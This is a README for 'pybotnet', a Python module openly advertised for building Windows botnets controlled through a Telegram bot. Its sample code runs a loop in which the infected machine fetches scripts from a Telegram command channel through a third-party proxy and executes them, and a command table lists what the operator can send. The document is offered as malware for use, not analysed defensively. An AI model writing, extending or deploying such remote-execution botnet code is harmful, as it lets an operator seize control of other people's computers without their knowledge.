# pybotnet version 0.05

## A module for building windows botnets with Python and Telegram control panel

### See the [TODO List](https://github.com/onionj/pybotnet/blob/master/TODOLIST.MD) if you want to help me

### Features:
• get and execute scripts from telegram \
• send message to telegram admin \
• get command from telegram


### Requirements:

• Python 3.6 or higher.
```
pip install -r requirements.txt
```

### Sample:

```python
import pybotnet
import time

TELEGRAM_TOKEN = '1468299500:AAHsvEH-5VyIfWYMzZcYxF_e00000000000'
ADMIN_CHAT_ID = '12345678910'
delay = 60

bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID, show_log=True)

while True:
    bot.get_and_execute_scripts_by_third_party_proxy()
    time.sleep(delay)

```

### Commmands:
Send this message to your api bot in telegram, using the admin account.
```
    COMMAND                                                 DO THIS
do_sleep <scconds> <message>                 # print(message); time.sleep(seccond)

```
